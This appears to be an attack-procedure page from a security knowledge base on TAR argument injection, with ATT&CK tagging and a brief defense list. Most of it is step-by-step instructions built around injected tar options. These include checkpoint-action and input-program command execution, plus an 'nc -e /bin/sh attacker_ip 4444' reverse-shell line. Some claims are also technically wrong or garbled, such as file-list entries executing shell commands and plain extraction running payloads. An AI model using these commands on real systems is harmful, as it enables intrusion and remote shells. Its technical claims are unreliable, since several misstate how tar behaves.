---
type: procedure
description: >-
  Inject malicious commands into TAR arguments to achieve arbitrary code
  execution on Unix-like systems.
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[Execution]]'
techniques:
  - '[[Unix Shell]]'
sub_techniques: []
tags:
  - argument-injection
  - command-injection
  - tar
commands:
  - '[[commands/tar-extract-archive]]'
  - '[[commands/tar-checkpoint-exec-injection]]'
  - '[[commands/tar-compression-program-injection]]'
  - '[[commands/tar-input-program-injection]]'
  - '[[commands/tar-files-from-injection]]'
platforms:
  - Linux
  - Unix
tools: []
validated: true
---

# TAR-Argument-Injection

## Summary

This procedure demonstrates how to inject arbitrary commands into the TAR archiving utility on Unix-like systems to achieve remote code execution. By abusing options like --checkpoint-action, --use-compress-program, and --files-from, attackers can execute shell commands during archive extraction or creation, bypassing input validation and evading detection in environments where TAR is used for file handling.

## Description

TAR is a standard Unix utility for creating and extracting tarball archives. Argument injection vulnerabilities arise when TAR processes untrusted input, such as filenames or option parameters derived from user-supplied data. This technique exploits TAR's flexibility in specifying external programs for compression, input filtering, or post-extraction actions, allowing attackers to append shell metacharacters (e.g., ; command) or specify malicious executables. It is particularly effective in scenarios like automated backup scripts, web uploads of archives, or CI/CD pipelines that unpack TAR files without sanitization. Successful injection leads to command execution with the privileges of the TAR process, enabling data exfiltration, persistence, or escalation. This maps to MITRE ATT&CK Execution tactic via Unix Shell command interpretation.

## Requirements

1. Access to a Unix-like system (Linux, macOS) where TAR is installed and executable.
2. A malicious tarball or controlled input to the TAR process (e.g., via a web upload or script).
3. Basic shell knowledge to craft payloads; no elevated privileges required initially, but injection inherits TAR's user context.
4. Tools like a text editor to create the malicious archive or input file.

## Defense

- Implement strict input validation and sanitization for all TAR arguments, rejecting shell metacharacters (;, |, &, etc.) and untrusted filenames.
- Run TAR in a sandboxed environment or with restricted privileges (e.g., using AppArmor or SELinux profiles).
- Monitor TAR executions via host-based intrusion detection (HIDS) for anomalous options like --checkpoint-action or --use-compress-program.
- Use whitelisting for allowed compression/input programs and disable risky options in TAR configurations.

## Objectives

1. Achieve arbitrary command execution during TAR archive processing.
2. Evade detection by mimicking legitimate archive operations.
3. Facilitate further attacks like privilege escalation or data theft using the injected commands.

## Instructions

### Step 1: Prepare a Basic TAR Extraction

**Context**: Start with a standard TAR extraction to understand baseline behavior. This step verifies TAR functionality and sets up for injection by extracting a sample archive. Use this to confirm the environment before attempting injections.

**Command** ([[commands/tar-extract-archive]]):
```bash
tar -xf malicious.tar
```

> This extracts the contents of malicious.tar into the current directory. If the archive contains injected payloads in later steps, they will execute here. Expected: Files extracted without errors; no output if clean.

### Step 2: Inject Command via Checkpoint Action

**Context**: Exploit the --checkpoint and --checkpoint-action options to execute a command after processing the first file in the archive. This is useful for delayed execution during extraction, evading simple logging.

**Command** ([[commands/tar-checkpoint-exec-injection]]):
```bash
tar --checkpoint=1 --checkpoint-action=exec=sh -c 'echo "Injected command executed" > /tmp/pwned.txt' -xf malicious.tar
```

> The --checkpoint=1 triggers after one file, and --checkpoint-action=exec runs the specified shell command. Replace the echo with a real payload like reverse shell initiation. Expected: Archive extracts, and /tmp/pwned.txt is created confirming execution.

### Step 3: Inject via Files-from List

**Context**: Use the -T or --files-from option to specify a file list that includes injected commands. If the list file is attacker-controlled, append shell commands to process unintended files or execute code.

**Command** ([[commands/tar-files-from-injection]]):
```bash
tar -T /path/to/malicious_list.txt -xf archive.tar
```

> Create malicious_list.txt with content like "file1 ; id > /tmp/user.txt". TAR interprets the list, executing the appended command. Expected: Extraction proceeds, but injected command output appears in /tmp/user.txt showing current user.

### Step 4: Inject via Input Program

**Context**: The -I option allows specifying a custom program to filter input before TAR processes it. Set this to a malicious script that executes code while pretending to be a compressor.

**Command** ([[commands/tar-input-program-injection]]):
```bash
tar -I 'sh -c "echo \"Fake input\" | cat"' -cf output.tar files/
```

> Here, -I runs a shell command as the input filter, allowing arbitrary execution during archive creation. For extraction, adapt similarly. Expected: Archive created successfully, but the injected command runs (e.g., log network connections if payload includes curl).

### Step 5: Inject via Compression Program

**Context**: The --use-compress-program option overrides the default compressor with a custom program, enabling code execution during compression/decompression phases. This is ideal for scenarios where archives are compressed on-the-fly.

**Command** ([[commands/tar-compression-program-injection]]):
```bash
tar --use-compress-program='sh -c "nc -e /bin/sh attacker_ip 4444 &"' -cf output.tar files/
```

> Replace with a payload like a reverse shell. During extraction (if compressed), it executes. Expected: Archive created, and listener on attacker_ip:4444 receives a shell connection.

**Success Criteria**: Verify injection by checking for side effects like files written to /tmp, network connections, or process listings (ps aux | grep sh).
